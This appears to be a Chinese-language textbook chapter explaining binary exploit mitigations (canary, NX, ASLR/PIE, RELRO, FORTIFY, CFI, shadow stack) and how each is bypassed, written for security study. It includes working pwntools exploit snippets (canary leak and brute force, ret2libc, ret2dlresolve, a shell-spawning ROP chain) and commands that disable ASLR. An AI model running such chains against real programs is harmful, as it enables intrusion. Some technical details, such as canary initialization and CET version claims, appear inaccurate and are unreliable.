## 7. 安全保护机制

安全保护机制是操作系统和编译器联合提供的**纵深防御体系**。每种机制针对一类攻击向量设计——栈溢出、堆利用、控制流劫持、信息泄露等——单独使用时均有绕过手段，但**多机制叠加**会极大提高攻击成本。

理解这些机制的**原理**和**绕过方法**，是安全研究者的必备技能：你需要知道保护在哪里、强度有多大、薄弱点在哪里，才能在合法授权的渗透测试中找到突破口，也才能在防御侧做出正确的加固决策。

### 7.1 Stack Canary（栈保护）

#### 7.1.1 原理

Stack Canary（栈金丝雀）是一种栈溢出检测机制。名字来源于矿工用金丝雀探测矿井毒气的典故——金丝雀先死说明有毒，Canary 值被改说明有溢出。

编译器在函数序言（prologue）中向栈帧插入一个**随机值**（canary），位于返回地址和保存的 RBP 之前。函数尾声（epilogue）中检查该值是否被修改，若被修改则调用 `__stack_chk_fail()` 终止程序并打印错误信息。

#### 7.1.2 栈帧布局对比

```text
无 Canary 保护的栈帧：                有 Canary 保护的栈帧：
┌──────────────────┐                 ┌──────────────────┐
│   返回地址         │                 │   返回地址         │
├──────────────────┤                 ├──────────────────┤
│   保存的 RBP      │                 │   保存的 RBP      │
├──────────────────┤                 ├──────────────────┤
│   buffer[64]     │                 │   Canary (8B)    │ ← 随机值
└──────────────────┘                 ├──────────────────┤
                                     │   buffer[64]     │
                                     └──────────────────┘
```

#### 7.1.3 编译器实现细节

GCC/Clang 通过编译选项控制 Canary 的行为：

```bash
# 关闭 Canary（学习/调试用）
gcc -fno-stack-protector -o vuln vuln.c

# 仅对包含 char 数组的函数启用（默认）
gcc -fstack-protector -o vuln vuln.c

# 对所有函数启用（生产环境推荐）
gcc -fstack-protector-all -o vuln vuln.c

# 对有较大缓冲区的函数启用（> 8 字节）
gcc -fstack-protector-strong -o vuln vuln.c
```

**`-fstack-protector` vs `-fstack-protector-strong` 的区别：**

| 选项 | 保护范围 | 性能开销 | 适用场景 |
|------|---------|---------|---------|
| `-fstack-protector` | 仅含 `char[]` 且大小 > 8B 的函数 | 低 | 默认配置 |
| `-fstack-protector-strong` | 含数组、地址取值、结构体含数组的函数 | 中 | 推荐用于生产 |
| `-fstack-protector-all` | 所有函数 | 较高 | 高安全要求 |

Canary 值在进程启动时由 C 运行时（`__libc_csu_init`）生成，从 `/dev/urandom` 读取。同一进程中所有线程共享同一个 canary 值（存储在线程本地存储 TLS 中的 `fs` 段寄存器指向的区域，x86-64 下通常位于 `fs:0x28`）。

#### 7.1.4 汇编层面对比

```asm
; 无 Canary 的函数序言和尾声
func:
    push   rbp
    mov    rbp, rsp
    sub    rsp, 0x40        ; 分配栈空间
    ; ... 函数体 ...
    leave
    ret

; 有 Canary 的函数序言和尾声
func:
    push   rbp
    mov    rbp, rsp
    sub    rsp, 0x40
    mov    rax, qword ptr fs:[0x28]  ; 读取 canary
    mov    [rbp-0x8], rax            ; 放到栈上
    ; ... 函数体 ...
    mov    rax, [rbp-0x8]
    xor    rax, qword ptr fs:[0x28]  ; 对比原始 canary
    jne    __stack_chk_fail          ; 不匹配则终止
    leave
    ret
```

#### 7.1.5 绕过方法

**方法一：信息泄露（最常用）**

通过格式化字符串漏洞、越界读取等方式泄露 canary 值，然后在溢出时填入正确的 canary。

```python
# 通过格式化字符串泄露 canary 的典型思路
# 假设 canary 在栈上位于格式化字符串的第 N 个参数位置
from pwn import *

p = process('./vuln')
# 先泄露 canary
p.sendline('%{}$lx'.format(N).encode())
canary = int(p.recvline(), 16)
log.info(f'Canary: {hex(canary)}')

# 然后在溢出 payload 中正确放置 canary
payload = b'A' * 64          # 填充到 canary 位置
payload += p64(canary)        # 写入正确的 canary
payload += p64(0)             # 覆盖 saved RBP
payload += p64(target_addr)   # 覆盖返回地址
p.sendline(payload)
```

**方法二：覆盖 Canary 之前的变量**

如果栈上存在函数指针、C++ 虚表指针或其他可控制执行流程的变量，且这些变量位于 buffer 和 canary 之间，可以精确覆写它们而不触发 canary 检查。

```text
栈布局示例：
┌──────────────────┐
│   返回地址         │
├──────────────────┤
│   saved RBP      │
├──────────────────┤
│   Canary         │
├──────────────────┤
│   func_ptr (8B)  │ ← 覆盖这里不触发 canary 检查
├──────────────────┤
│   buffer[64]     │ ← 从这里开始溢出
└──────────────────┘
```

**方法三：fork 子进程逐字节爆破**

当目标程序通过 `fork()` 创建子进程处理请求时，父子进程共享同一份 canary（fork 不会重新随机化 canary）。可以逐字节猜测 canary：

```python
# 逐字节爆破 canary（适用于 fork 服务器）
from pwn import *

def try_byte(canary_prefix, byte_val):
    """尝试 canary 的下一个字节"""
    p = process('./vuln')
    payload = b'A' * 64
    payload += canary_prefix + bytes([byte_val])
    p.send(payload)
    result = p.recv(timeout=1)
    p.close()
    return b'Stack' not in result  # 没崩溃说明正确

canary = b'\x00'  # canary 最低字节始终为 0（null byte 防止字符串泄露）
for i in range(1, 8):
    for byte in range(256):
        if try_byte(canary, byte):
            canary += bytes([byte])
            break

log.success(f'Canary: {canary.hex()}')
```

> **为什么 canary 最低字节是 `\x00`？** 这是为了防止通过 `strcpy`、`puts` 等以 null 结尾的字符串函数泄露 canary。null byte 作为字符串终止符，阻止了后续字节的输出。

**方法四：利用 SSP 泄露 canary**

GCC 的 Stack Smashing Protection 机制在检测到 canary 被破坏时，会调用 `__stack_chk_fail()` 并打印被破坏的函数名。在某些实现中，错误信息可能泄露足够的内存信息辅助攻击。

#### 7.1.6 Canary 的局限性

- **只保护栈**：不保护堆、全局数据段中的数据
- **只检测连续溢出**：不检测精确覆写（如覆盖 canary 之前的变量）
- **fork 场景下可爆破**：每次 fork 共享相同 canary
- **不能防御逻辑漏洞**：如 use-after-free、double free 等与溢出无关的漏洞
- **不保护非控制数据**：只关心返回地址是否被篡改，不关心局部变量是否被破坏

### 7.2 NX/DEP（不可执行内存保护）

#### 7.2.1 原理

NX（No-eXecute）/ DEP（Data Execution Prevention）通过 CPU 的**硬件支持**（Intel 的 XD bit、AMD 的 NX bit）标记内存页的执行权限。栈和堆被标记为**可读写但不可执行**，当 CPU 尝试在这些页面上执行指令时，会触发硬件异常（段错误 / Segmentation Fault）。

这项技术从根本上**封杀了传统栈溢出利用方式**——将 shellcode 写入栈上并跳转执行。没有 NX 的时代，攻击者只需 `buffer overflow → 覆盖返回地址为 buffer 地址 → 执行 shellcode`，极其简单。

#### 7.2.2 内存段权限对照表

```text
内存段       读  写  执行    说明
──────────────────────────────────────
.text        ✓   ✗   ✓     代码段：只读+可执行
.rodata      ✓   ✗   ✗     只读数据：字符串常量等
.data        ✓   ✓   ✗     已初始化全局变量
.bss         ✓   ✓   ✗     未初始化全局变量
heap         ✓   ✓   ✗     堆（malloc 分配）
stack        ✓   ✓   ✗     栈（函数局部变量）
mmap (RW)    ✓   ✓   ✗     匿名映射
mmap (RWX)   ✓   ✓   ✓     需要 execstack 或 mprotect
```

#### 7.2.3 编译和系统配置

```bash
# 关闭 NX（允许栈上执行代码，学习用）
gcc -z execstack -o vuln vuln.c

# 开启 NX（默认）
gcc -z noexecstack -o vuln vuln.c

# 系统级 DEP 配置（Linux 内核参数）
cat /proc/sys/vm/mmap_min_addr  # 最低可映射地址，非零表示启用基础保护
# 通常为 65536 (0x10000)，防止 NULL 指针解引用攻击

# 检查程序的 PT_GNU_STACK 段
readelf -l vuln | grep GNU_STACK
#  RW  → NX 已启用（栈不可执行）
#  RWX → NX 已关闭（栈可执行，危险）
```

#### 7.2.4 绕过方法

NX 的存在意味着**不能在栈/堆上直接执行 shellcode**，但攻击者可以利用程序或 libc 中**已经存在的可执行代码**来实现任意操作。

**方法一：ROP（Return-Oriented Programming）**

ROP 是当前最主流的绕过技术。核心思想是：在程序的 `.text` 段或 libc 中找到以 `ret` 指令结尾的短小代码片段（称为 **gadget**），将多个 gadget 的地址串联在栈上，通过连续的 `ret` 指令跳转执行，最终实现任意功能。

```text
ROP 链的工作原理：

栈布局：
┌──────────────────┐
│  gadget_1 地址    │  → pop rdi; ret        （设置第一个参数）
├──────────────────┤
│  "/bin/sh" 地址   │  → 作为 rdi 的值
├──────────────────┤
│  gadget_2 地址    │  → pop rsi; pop rdx; ret（设置第二、三参数）
├──────────────────┤
│  0               │  → rsi = NULL
├──────────────────┤
│  0               │  → rdx = NULL
├──────────────────┤
│  system 地址      │  → 调用 system("/bin/sh")
└──────────────────┘

执行流程：
ret → gadget_1 → ret → gadget_2 → ret → system
```

**查找 gadget 的工具：**

```bash
# ROPgadget — 最常用的 ROP gadget 搜索工具
ROPgadget --binary ./vuln --only "pop|ret"
ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only "pop|ret"

# ropper — 另一个强大的 gadget 搜索工具
ropper -f ./vuln --search "pop rdi"

# rp++ — 快速 gadget 搜索
rp-lin-x64 -f ./vuln -r 5  # 搜索长度 <= 5 条指令的 gadget
```

**方法二：ret2libc**

跳转到 libc 中的函数（如 `system`、`execve`、`mprotect`），绕过 NX 限制。

```python
# ret2libc 基本利用（已知 libc 地址）
from pwn import *

elf = ELF('./vuln')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# 需要先通过信息泄露获取 libc 基址
# 泄露某个 GOT 表项的真实地址，减去已知偏移得到基址
libc_base = leaked_addr - libc.symbols['puts']
system_addr = libc_base + libc.symbols['system']
bin_sh_addr = libc_base + next(libc.search(b'/bin/sh'))

# 需要一个 pop rdi; ret gadget
pop_rdi = libc_base + 0x23b6a  # 偏移因 libc 版本而异

payload  = b'A' * 72           # padding (64 buffer + 8 canary 如果已绕过)
payload += p64(0)              # fake RBP
payload += p64(pop_rdi)        # gadget: pop rdi; ret
payload += p64(bin_sh_addr)    # rdi = "/bin/sh"
payload += p64(system_addr)    # call system("/bin/sh")
```

**方法三：ret2plt**

利用 PLT（Procedure Linkage Table）中已解析或可解析的函数。

```python
# 即使没有信息泄露，也可以利用 PLT 调用已链接的函数
# PLT 地址在无 PIE 时是固定的
puts_plt = elf.plt['puts']       # puts@plt
puts_got = elf.got['puts']       # puts 的 GOT 表项

# 利用 puts@plt 输出 puts 的 GOT 地址，泄露 libc 基址
payload  = b'A' * 72
payload += p64(pop_rdi)
payload += p64(puts_got)         # 参数：puts 的 GOT 地址
payload += p64(puts_plt)         # 调用 puts(puts_got)
payload += p64(main_addr)        # 返回 main，再次利用
```

**方法四：mprotect 修改内存权限**

通过 `mprotect()` 系统调用将某段内存改为可执行，然后跳转到 shellcode。

```python
# 需要先泄露 libc 地址
mprotect = libc_base + libc.symbols['mprotect']
shellcode_addr = bss_addr  # 选择一个已知的 RW 内存地址

# ROP 链：mprotect(页对齐地址, 大小, 7) + 读入 shellcode + 跳转
# mprotect 的地址参数必须页对齐（4096 字节边界）
page_aligned = shellcode_addr & ~0xfff
payload  = b'A' * 72
payload += p64(pop_rdi) + p64(page_aligned)
payload += p64(pop_rsi) + p64(0x1000)    # 大小
payload += p64(pop_rdx) + p64(7)         # RWX
payload += p64(mprotect)
payload += p64(read_input_addr)           # 读入 shellcode
payload += p64(shellcode_addr)            # 跳转执行
```

#### 7.2.5 NX 与其他机制的关系

NX 单独存在时，ROP 是几乎万能的绕过手段。但当 NX + ASLR + PIE + Full RELRO + Canary 全部开启时，攻击者需要先泄露多个地址（libc 基址、栈地址、程序基址），攻击难度成指数级增长。

### 7.3 ASLR/PIE（地址空间布局随机化）

#### 7.3.1 原理

ASLR（Address Space Layout Randomization）在**每次程序运行时**随机化以下内存区域的基址：

| 区域 | 随机化粒度 | 熵值（64位） | 说明 |
|------|-----------|-------------|------|
| 栈 | 页对齐（4KB） | ~28 bits | 每次运行栈地址不同 |
| 堆 | 页对齐（4KB） | ~28 bits | brk/mmap 分配地址随机 |
| mmap 区域 | 页对齐（4KB） | ~28 bits | 动态库加载地址随机 |
| libc 基址 | 页对齐（4KB） | ~28 bits | libc.so 加载位置随机 |

PIE（Position Independent Executable）是 ASLR 的**扩展**，在上述基础上**额外随机化程序自身的加载地址**（.text、.data 等段的基址）。

```bash
# 开启 PIE
gcc -pie -fPIE -o vuln vuln.c

# 关闭 PIE（程序基址固定，但栈/堆/mmap 仍随机化）
gcc -no-pie -o vuln vuln.c

# 系统级 ASLR 配置
cat /proc/sys/kernel/randomize_va_space
# 0 = 关闭 ASLR
# 1 = 部分随机化（栈、mmap、堆随机化，.text 固定）
# 2 = 完全随机化（包含 PIE）

# 临时关闭 ASLR（调试用）
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space

# 恢复 ASLR
echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
```

#### 7.3.2 PIE 开关对地址的影响

```text
无 PIE（-no-pie）时：
  .text: 0x400000  （固定）
  .plt:  0x401000  （固定）
  .got:  0x404000  （固定）
  main:  0x401136  （固定，可直接用于 ROP）

有 PIE（-pie）时：
  第1次运行: .text=0x55a3e70000, main=0x55a3e71136
  第2次运行: .text=0x7f4b2c2000, main=0x7f4b2c3136
  （每次运行基址都不同，但相对偏移不变）

关键洞察：PIE 随机化的是基址，程序内部的相对偏移永远不变。
只要泄露任意一个已知地址，就能计算出所有其他地址。
```

#### 7.3.3 绕过方法

**方法一：信息泄露（最主要的方法）**

泄露某个已知符号的真实地址，减去编译时的固定偏移，得到 PIE 或 libc 的基址。

```python
# 泄露 libc 基址的典型流程
# 1. 利用 puts@plt 输出 puts@got 中存储的真实地址
puts_plt = 0x401030    # 无 PIE 时 PLT 地址固定
puts_got = 0x404018    # 无 PIE 时 GOT 地址固定

# 构造 ROP 链：puts(puts_got)
payload = b'A' * 72
payload += p64(pop_rdi_ret)    # pop rdi; ret
payload += p64(puts_got)       # rdi = puts@got
payload += p64(puts_plt)       # 调用 puts，输出 puts 的真实地址
payload += p64(main_addr)      # 返回 main，进行第二轮利用

# 2. 解析泄露的真实地址
p.sendline(payload)
leaked = u64(p.recvline().strip().ljust(8, b'\x00'))
libc_base = leaked - libc.symbols['puts']
log.success(f'libc base: {hex(libc_base)}')

# 3. 计算 system 和 "/bin/sh" 的地址
system = libc_base + libc.symbols['system']
bin_sh = libc_base + next(libc.search(b'/bin/sh'))
```

**方法二：部分覆写（Partial Overwrite）**

由于地址空间按页对齐（4KB = 0x1000），PIE 基址的低 12 位始终为零。只覆写返回地址的最低 1-2 字节，可以跳转到同一二进制文件内的不同位置。

```text
原始返回地址: 0x555555555234
只覆写低 12 位: 0x555555555xxx  （1/4096 的概率命中目标）
只覆写低 16 位: 0x55555555xxxx  （1/65536 的概率，因为高 4 位可能变化）

实际场景：
- 32 位程序：覆写低 2 字节 → 1/65536 概率（爆破可行）
- 64 位程序：覆写低 2 字节 → 1/65536 概率（爆破可行）
- 64 位程序：覆写低 3 字节 → 1/16777216 概率（需要自动化爆破）
```

```python
# 部分覆写示例
from pwn import *

for i in range(65536):
    p = process('./vuln')
    # 只覆写返回地址的低 2 字节
    payload = b'A' * 72
    payload += p16(target_low_16)  # 只覆盖低 16 位
    p.send(payload)
    try:
        p.send(b'id\n')
        result = p.recv(timeout=1)
        if b'uid' in result:
            log.success(f'Hit at attempt {i}!')
            p.interactive()
            break
    except:
        pass
    p.close()
```

**方法三：利用未随机化的段（无 PIE 时）**

当程序未开启 PIE 时，`.text`、`.plt`、`.got` 段地址固定，可以直接使用。此时只需要泄露 libc 地址即可完成攻击。

```text
各种配置下的攻击难度：

保护配置                              需要泄露的信息          难度
─────────────────────────────────────────────────────────────
无 PIE + 无 ASLR                     什么都不需要            ★☆☆☆☆
无 PIE + ASLR                        libc 基址               ★★☆☆☆
PIE + ASLR                           程序基址 + libc 基址    ★★★☆☆
PIE + ASLR + Canary                  + canary 值             ★★★★☆
PIE + ASLR + Canary + Full RELRO     + 需要代码执行原语      ★★★★★
```

**方法四：ret2dl-resolve（针对无 PIE 的程序）**

利用动态链接器的符号解析机制，伪造符号表和字符串表，让链接器解析出攻击者指定的函数（如 `system`）。这在 Full RELRO 未启用时特别有效。

```python
# 使用 pwntools 的 Ret2dlresolve 自动化工具
from pwn import *
from pwnlib.rop.ret2dlresolve import Ret2dlresolvePayload

elf = ELF('./vuln')
rop = ROP(elf)
dlresolve = Ret2dlresolvePayload(elf, symbol='system', args=['/bin/sh'])

rop.read(0, dlresolve.data_addr)   # 读入伪造的链接数据
rop.ret2dlresolve(dlresolve)        # 触发动态链接解析

p.sendline(flat({72: rop.chain()}))
p.send(dlresolve.payload)           # 发送伪造数据
```

### 7.4 RELRO（GOT 保护）

#### 7.4.1 原理

RELRO（RELocation Read-Only）保护 ELF 文件中的 **GOT（Global Offset Table）** 不被恶意写入。GOT 表存储了动态链接函数的真实地址，如果 GOT 可写，攻击者可以覆写其中的函数指针，在下次调用该函数时跳转到任意地址。

```text
GOT 劫持原理：

正常流程：
call printf@plt → 跳转到 printf@got → printf 的真实地址 → 执行 printf

被劫持后：
call printf@plt → 跳转到 printf@got → 被覆写为 system 的地址 → 执行 system
```

#### 7.4.2 三种 RELRO 级别

| 级别 | 编译选项 | GOT 可写 | 启动时间 | 安全性 |
|------|---------|---------|---------|--------|
| No RELRO | （默认） | 全部可写 | 最快 | 无保护 |
| Partial RELRO | `-z relro` | `.got.plt` 可写 | 快 | 部分保护 |
| Full RELRO | `-z relro -z now` | 全部只读 | 较慢 | 完全保护 |

```bash
# 部分 RELRO（默认，GCC 4.0+）
gcc -z relro -o vuln vuln.c

# 完全 RELRO
gcc -z relro -z now -o vuln vuln.c

# 检查程序的 RELRO 状态
checksec ./vuln
# 或
readelf -l vuln | grep GNU_RELRO   # 有此段表示 RELRO 已启用
readelf -d vuln | grep BIND_NOW     # 有此标记表示 Full RELRO
```

#### 7.4.3 Partial RELRO vs Full RELRO

```text
Partial RELRO（默认）：
- .got 段（非 PLT 的 GOT 表项）被标记为只读
- .got.plt 段（PLT 的 GOT 表项）仍然可写
- 懒绑定（Lazy Binding）仍然生效
- 函数在第一次调用时才解析地址，写入 .got.plt

Full RELRO：
- 启动时立即解析所有动态符号（-z now，非懒绑定）
- 解析完成后将整个 GOT 段标记为只读
- .got.plt 也被保护
- 代价：启动时间增加（需要解析所有符号）

为什么懒绑定是安全问题？
程序可能链接了数百个库函数，懒绑定意味着只在首次调用时才解析。
这些未解析的 GOT 条目在解析前存储的是 PLT stub 地址，
解析后才替换为真实地址。在解析前后的窗口期内，.got.plt 都是可写的。
```

#### 7.4.4 绕过方法

**Full RELRO 下的替代攻击路径：**

当 GOT 覆写不可行时，攻击者需要寻找其他写入目标：

```python
# 方法一：覆写 __malloc_hook / __free_hook（已废弃，glibc 2.34+ 移除）
# 这些 hook 函数在 malloc/free 之前被调用
malloc_hook = libc_base + libc.symbols['__malloc_hook']
# 将其覆写为 system 的地址
# 下次触发 malloc 时会调用 system

# 方法二：覆写 .fini_array（析构函数表）
# 程序退出时会调用 .fini_array 中的函数指针
# 无 PIE 时 .fini_array 地址固定

# 方法三：利用 stderr 缓冲区（_IO_2_stderr_）
# 伪造 FILE 结构体，在 _IO_OVERFLOW 时劫持控制流
# FSOP（File Stream Oriented Programming）

# 方法四：利用 exit handler（atexit/__exit_funcs）
# 覆写 exit 处理函数链表
```

**Partial RELRO 下的 GOT 覆写：**

```python
# 在 Partial RELRO 下，.got.plt 仍然可写
# 选择一个保护程序中存在但触发频率低的函数
# 例如：覆盖 strlen@got 为 system

strlen_got = elf.got['strlen']
system_addr = libc_base + libc.symbols['system']

# 通过任意写漏洞覆写 GOT
# 下次调用 strlen(input) 时实际执行 system(input)
write(strlen_got, system_addr)
```

### 7.5 FORTIFY_SOURCE（源码级加固）

#### 7.5.1 原理

`FORTIFY_SOURCE` 是 GCC 的**编译时**安全检查机制，在编译阶段将不安全的函数替换为带边界检查的安全版本。

```text
被替换的危险函数：           安全替换版本：
strcpy    → __strcpy_chk    （检查目标缓冲区大小）
strcat    → __strcat_chk    （检查目标缓冲区大小）
sprintf   → __sprintf_chk   （检查目标缓冲区大小）
gets      → __gets_chk      （编译时警告+运行时检查）
memcpy    → __memcpy_chk    （检查目标缓冲区大小）
```

#### 7.5.2 使用方法

```bash
# FORTIFY_SOURCE 级别
gcc -D_FORTIFY_SOURCE=1 -O1 -o vuln vuln.c   # 级别 1：编译时可确定大小时检查
gcc -D_FORTIFY_SOURCE=2 -O1 -o vuln vuln.c   # 级别 2：级别 1 + 额外对象大小检查
gcc -D_FORTIFY_SOURCE=3 -O2 -o vuln vuln.c   # 级别 3（GCC 12+）：使用 __builtin_dynamic_object_size

# 注意：必须配合优化选项（-O1 或更高）才能生效
# 无优化时（-O0），编译器无法在编译时确定缓冲区大小
```

#### 7.5.3 实际效果

```c
// 源代码
char buf[10];
strcpy(buf, user_input);  // 危险：无长度检查

// 使用 -D_FORTIFY_SOURCE=1 编译后等价于
__strcpy_chk(buf, user_input, 10);  // 安全：检查 src 长度 <= 10

// 运行时如果长度超过 10，调用 __chk_fail() 终止程序
*** buffer overflow detected ***: terminated
```

#### 7.5.4 局限性

- **只在编译时可确定大小时生效**：动态分配的内存不被保护
- **只检查已知不安全模式**：`memcpy(dst, src, len)` 中如果 `len` 是变量，编译器无法判断是否越界
- **不影响格式化字符串漏洞**：`printf(user_input)` 不受 FORTIFY 保护
- **需要优化级别**：`-O0` 时完全失效

### 7.6 CFI（控制流完整性保护）

#### 7.6.1 原理

CFI（Control Flow Integrity）是更高级的控制流劫持防护。传统保护（Canary、NX、ASLR）保护的是**数据**不被破坏或地址不被预知，CFI 直接保护**控制流**——确保程序的跳转/调用只能到达合法的目标。

CFI 分为两类：

- **前向 CFI（Forward-edge CFI）**：保护间接调用（`call *%rax`），验证调用目标的函数签名是否合法
- **后向 CFI（Backward-edge CFI）**：保护返回地址，类似 Shadow Stack

#### 7.6.2 现有实现

| 实现 | 提供者 | 范围 | 开销 | 说明 |
|------|--------|------|------|------|
| Control-Flow Enforcement (CET) | Intel | 硬件级 | 极低 | Shadow Stack + Indirect Branch Tracking (IBT) |
| Clang CFI | LLVM | 编译器级 | 5-10% | 需要 LTO，链接时所有模块可见 |
| kCFI | Linux Kernel | 内核级 | 低 | 内核 6.1+ 默认用于内核模块 |
| Shadow Call Stack | ARM | 硬件+编译器 | 低 | ARM64 Android 采用 |
| Retpoline | Google/Linux | 软件级 | 中 | 针对 Spectre v2 的缓解措施 |

```bash
# Clang CFI 使用示例
clang -flto -fvisibility=hidden -fsanitize=cfi -o vuln vuln.c

# 编译器会为每个间接调用插入检查：
# - 验证目标地址是否是已知的合法函数入口
# - 验证函数签名是否匹配
# - 不匹配则 trap（trap 模式）或生成诊断（diag 模式）
```

#### 7.6.3 攻击 CFI

CFI 也不是万能的：

- **粗粒度 CFI**：只检查目标是合法函数入口，不限制具体是哪个函数。攻击者可以跳转到任何函数的开头，虽然不能跳到函数中间
- **类型混淆**：如果 CFI 只检查签名不检查语义，两个签名相同的函数可以互换
- **数据攻击**：CFI 不防御数据流攻击——修改数据变量而非函数指针
- **JIT 代码**：JIT 编译器生成的代码可能不被 CFI 覆盖

### 7.7 Shadow Stack（影子栈）

#### 7.7.1 原理

Shadow Stack 是后向 CFI 的实现。维护一个**独立的、只读的影子栈**，专门存放返回地址。函数返回时，CPU 同时从主栈和影子栈弹出返回地址并比较，不匹配则终止。

```text
主栈：                        影子栈：
┌──────────────┐             ┌──────────────┐
│ 返回地址 C    │ ← 溢出!    │ 返回地址 C    │ ← 干净副本
├──────────────┤             ├──────────────┤
│ 返回地址 B    │             │ 返回地址 B    │
├──────────────┤             ├──────────────┤
│ 返回地址 A    │             │ 返回地址 A    │
└──────────────┘             └──────────────┘

函数返回时：CPU 比较两个栈顶的返回地址
- 相同 → 正常返回
- 不同 → 异常终止（ROP 被阻止）
```

#### 7.7.2 Intel CET Shadow Stack

Intel CET（Control-flow Enforcement Technology）从第 11 代酷睿（Rocket Lake）开始提供硬件级支持：

```text
硬件支持：
- 新增 SHSTK（Shadow Stack）特性标记
- CPU 提供 SHADOW_STACK 相关指令：SAVEPREVSSP、RSTORSSP、SETSSBSY、INCSSPQ
- 影子栈存储在单独的内存区域，只能由特定指令修改
- 用户态程序无法直接读写影子栈

软件支持：
- Linux 内核 5.14+ 支持 CET
- glibc 2.32+ 支持 Shadow Stack
- GCC 8+ / Clang 7+ 支持编译影子栈
- 通过 prctl(PR_SET_SHADOW_STACK_STATUS) 启用
```

#### 7.7.3 绕过方法

- **COP/JOP**：Shadow Stack 只保护返回地址，不保护间接跳转（`jmp *%rax`）。结合 Call-Oriented Programming (COP) 或 Jump-Oriented Programming (JOP) 可以绕过
- **Signal Frame 操纵**：信号处理函数的帧结构复杂，某些实现中信号帧可以被伪造
- **线程栈切换**：在多线程环境中切换线程可能暴露影子栈的管理弱点

### 7.9 实战案例：多机制叠加的利用分析

#### 7.9.1 案例背景

目标程序编译选项：`-fstack-protector-strong -pie -z noexecstack -z relro -z now`（Full RELRO + Canary + NX + PIE）。

程序存在一个栈缓冲区溢出漏洞，但开启了全部主要保护。

#### 7.9.2 攻击步骤分解

```text
Step 1: 绕过 Canary
  - 观察程序是否有 format string 或越界读
  - 如果程序 fork 子进程，逐字节爆破 canary
  - 如果没有其他漏洞，canary 构成第一道屏障

Step 2: 绕过 PIE + ASLR
  - 利用已泄露的信息（如 Step 1 的 format string）
  - 输出某个 GOT 表项的真实地址（如果存在未解析的条目）
  - 计算 libc 基址和程序基址
  - Full RELRO 下 GOT 已只读，但读取仍然可以泄露地址

Step 3: 绕过 NX
  - 构造 ROP 链（利用已知的 libc 基址）
  - 调用 system("/bin/sh") 或 execve("/bin/sh", NULL, NULL)
  - 或者：调用 mprotect 修改某段内存为可执行，写入 shellcode

Step 4: 构造最终 payload
```

```python
# 完整利用示例（假设已通过某种方式泄露了 canary 和 libc 基址）
from pwn import *

elf = ELF('./vuln')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# 已泄露的信息
canary = 0x1234567890abcdef
libc_base = 0x7ffff7dc2000
program_base = 0x555555554000

system = libc_base + libc.symbols['system']
bin_sh = libc_base + next(libc.search(b'/bin/sh'))

# 在 libc 中查找 gadgets
pop_rdi = libc_base + 0x23b6a      # pop rdi; ret
ret = libc_base + 0x23b6b          # ret（用于栈对齐）

payload  = b'A' * 64               # buffer 填充
payload += p64(canary)              # 正确的 canary
payload += p64(0)                   # saved RBP
payload += p64(ret)                 # 栈对齐（16 字节对齐）
payload += p64(pop_rdi)             # pop rdi; ret
payload += p64(bin_sh)              # rdi = "/bin/sh"
payload += p64(system)              # system("/bin/sh")

p = process('./vuln')
p.send(payload)
p.interactive()
```

#### 7.9.3 防御视角的启示

```text
单靠一种保护是不够的。纵深防御的思路是：

1. Canary + ASLR → 提高信息泄露的难度
2. NX → 消除直接执行 shellcode 的可能
3. Full RELRO → 消除 GOT 劫持的可能
4. PIE → 消除固定地址 ROP 的可能
5. FORTIFY → 减少缓冲区溢出的入口
6. CFI → 消除粗粒度控制流劫持
7. Shadow Stack → 消除 ROP 的核心机制

每一层都迫使攻击者需要额外的漏洞或技术来绕过。
当所有保护全部启用时，攻击者需要：至少一个信息泄露漏洞 + 至少一个内存破坏漏洞。
这大幅提高了攻击的成本和复杂度。
```

### 7.10 常见误区

**误区一：关闭保护方便调试，上线再开**

实际开发中经常看到 `-fno-stack-protector -no-pie` 用于调试，但上线时忘记改回来。应该在 CI/CD 中加入 `checksec` 自动检查，拒绝编译产物缺少安全保护的构建。

**误区二：开了 ASLR 就安全了**

ASLR 只增加猜测地址的难度，不阻止通过信息泄露获取真实地址。而且 32 位系统的 ASLR 熵值很低（栈随机化约 16 位），爆破可行。

**误区三：Full RELRO 就不怕 GOT 攻击了**

Full RELRO 只保护 GOT 表不被写入。攻击者仍然可以覆写 `.fini_array`、`atexit` 处理函数、`__malloc_hook`（glibc < 2.34）、FILE 结构体等其他函数指针。

**误区四：Canary 能防止所有栈溢出**

Canary 只检测对返回地址的连续覆写。精确覆写 canary 之前的变量（如函数指针）不会触发检查。格式化字符串漏洞等非溢出类漏洞完全不受 Canary 影响。

**误区五：64 位 ASLR 无法爆破**

64 位 ASLR 熵值确实很高（约 28 位），但部分覆写只改低 12-16 位时，爆破概率在 1/4096 到 1/65536 之间，在 fork 服务器场景下完全可行。

***
